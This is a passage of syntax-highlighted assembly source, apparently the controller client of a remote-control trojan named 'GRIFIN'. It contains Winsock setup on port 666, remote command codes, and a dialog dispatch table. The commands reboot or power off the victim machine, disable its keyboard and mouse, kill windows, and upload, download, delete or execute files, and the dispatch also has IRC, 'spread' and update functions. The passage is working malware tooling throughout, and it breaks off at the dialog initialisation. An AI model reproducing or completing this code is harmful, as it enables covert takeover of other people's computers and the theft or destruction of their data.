</span><span class="sc5">EM_GETPASSWORDCHAR</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00D2h</span><span class="sc0">
</span><span class="sc5">EM_SETMARGINS</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00D3h</span><span class="sc0">
</span><span class="sc5">EM_GETMARGINS</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00D4h</span><span class="sc0">



</span><span class="sc9">.Data</span><span class="sc0">
    </span><span class="sc5">send_repeat</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">file_open?</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">IO_Bytes_Count</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">hInst</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">hMenu</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">hDlg</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">fhandle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">sockhandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">PORT</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">666</span><span class="sc0">
    </span><span class="sc5">TheIP</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">dlg_start</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'START_CLIENT'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">irc_dialog</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'IRC_DIALOG'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">spread_dialog</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SPREAD_DIALOG'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">update_dialog</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UPDATE_DIALOG'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">chat_dialog</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CHAT_DIALOG'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">grifin_welcome</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'      !!!Welcome to GRIFIN!!!'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'         REMOTE CONTROL'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0"> 
    </span><span class="sc5">line_g</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'--------------------------------------------------------'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">error_1</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'Not Connect to IP...'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    


    </span><span class="sc5">open_cd</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'!124'</span><span class="sc0">
    </span><span class="sc5">close_cd</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'!125'</span><span class="sc0">
    </span><span class="sc5">msg_box</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'!126'</span><span class="sc0">
    </span><span class="sc5">reboot_system</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'!115'</span><span class="sc0">
    </span><span class="sc5">power_off</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'!110'</span><span class="sc0">  
    </span><span class="sc5">download_file</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'!122'</span><span class="sc0">
    </span><span class="sc5">key_off</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'!118'</span><span class="sc0">
    </span><span class="sc5">mouse_off</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'!109'</span><span class="sc0">
    </span><span class="sc5">kill_window</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'!211'</span><span class="sc0">

</span><span class="sc5">WNDCLASS</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
        </span><span class="sc5">clsStyle</span><span class="sc0">          </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsLpfnWndProc</span><span class="sc0">    </span><span class="sc5">ULONG</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsCbClsExtra</span><span class="sc0">     </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsCbWndExtra</span><span class="sc0">     </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsHInstance</span><span class="sc0">      </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsHIcon</span><span class="sc0">          </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsHCursor</span><span class="sc0">        </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsHbrBackground</span><span class="sc0">  </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsLpszMenuName</span><span class="sc0">   </span><span class="sc5">ULONG</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">clsLpszClassName</span><span class="sc0">  </span><span class="sc5">ULONG</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">hIconSm</span><span class="sc0">           </span><span class="sc5">UINT</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WNDCLASS</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">MSGSTRUCT</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">

        </span><span class="sc5">msHWND</span><span class="sc0">          </span><span class="sc5">UINT</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">msMESSAGE</span><span class="sc0">       </span><span class="sc5">UINT</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">msWPARAM</span><span class="sc0">        </span><span class="sc5">UINT</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">msLPARAM</span><span class="sc0">        </span><span class="sc5">ULONG</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">msTIME</span><span class="sc0">          </span><span class="sc5">ULONG</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">msPT</span><span class="sc0">            </span><span class="sc5">ULONG</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">MSGSTRUCT</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">WSADATA</span><span class="sc0">   </span><span class="sc9">struc</span><span class="sc0">

        </span><span class="sc5">mVersion</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mHighVersion</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">szDescription</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">257</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">szSystemStatus</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">129</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">iMaxSockets</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">iMaxUpdDg</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">lpVendorInfo</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">WSADATA</span><span class="sc0">  </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">SOCKADDR</span><span class="sc0">  </span><span class="sc9">struc</span><span class="sc0">

        </span><span class="sc5">sin_family</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">sin_port</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">sin_addr</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">sin_zero</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SOCKADDR</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

        </span><span class="sc5">wsadata</span><span class="sc0">         </span><span class="sc5">WSADATA</span><span class="sc0">         </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc5">sin</span><span class="sc0">             </span><span class="sc5">SOCKADDR</span><span class="sc0">        </span><span class="sc4">&lt;&gt;</span><span class="sc0">
        </span><span class="sc5">msg</span><span class="sc0">             </span><span class="sc5">MSGSTRUCT</span><span class="sc0">       </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc5">wc</span><span class="sc0">              </span><span class="sc5">WNDCLASS</span><span class="sc0">        </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">


    </span><span class="sc5">cmd_1</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">cmd_2</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">Send_Buffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">Read_Buffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">data_</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">16000</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">.Code</span><span class="sc0">

</span><span class="sc5">client</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">hInst</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wsadata</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0101h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WSAStartup</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">   
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SOCK_STREAM</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PF_INET</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">socket</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">sockhandle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">sin.sin_family</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PORT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">htons</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">sin.sin_port</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> 

</span><span class="sc5">reg_class</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wc.clsStyle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">CS_HREDRAW</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CS_VREDRAW</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CS_GLOBALCLASS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wc.clsLpfnWndProc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WndProc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wc.clsCbClsExtra</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wc.clsCbWndExtra</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hInst</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wc.clsHInstance</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">IDI_ICON1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadIconA</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wc.clsHIcon</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc5">IDC_ARROW</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadCursorA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wc.clsHCursor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Main_Dialog</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dlg_start</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hInst</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DialogBoxParamA</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Wnd_finish</span><span class="sc0">

</span><span class="sc5">WndProc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">hwnd</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wmsg</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">lparam</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DefWindowProcA</span><span class="sc0">

</span><span class="sc5">Wnd_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">WndProc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">WndProc</span><span class="sc0">



</span><span class="sc5">Main_Dialog</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">hwnd</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wmsg</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc5">WM_INITDIALOG</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">m_init</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc5">WM_COMMAND</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">m_command</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_CLOSE</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_dialog</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
</span><span class="sc5">Dialog_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">close_dialog</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">sockhandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">closesocket</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WSACleanup</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EndDialog</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Dialog_end</span><span class="sc0">


</span><span class="sc5">m_command</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_EXIT</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_dialog</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_CONNECT</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">connect_</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_IRC</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">IRC_</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_SPREAD</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">spread_</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_UPDATE</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">update_</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_CHAT</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">chat_</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_OPEN_CD</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">opencd_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_CLOSE_CD</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">closecd_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_MSG_BOX</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">msgbox_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_REBOOT_SYSTEM</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">reboot_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_POWER_OFF</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">poweroff_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_DOWNLOAD_FILE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">download_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_UPLOAD_FILE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">upload_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_DELETE_FILE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">deletef_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_EXECUTE_FILE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">execute_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_COPY_FILE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">copyf_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_MOVE_FILE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">movef_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_MOUSE_OFF</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">mouseoff_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_KEYBOARD_OFF</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">keyboardoff_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_KILL_WINDOWS</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">killwindows_</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">


</span><span class="sc5">m_init</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">grifin_welcome</span><span class="sc0">
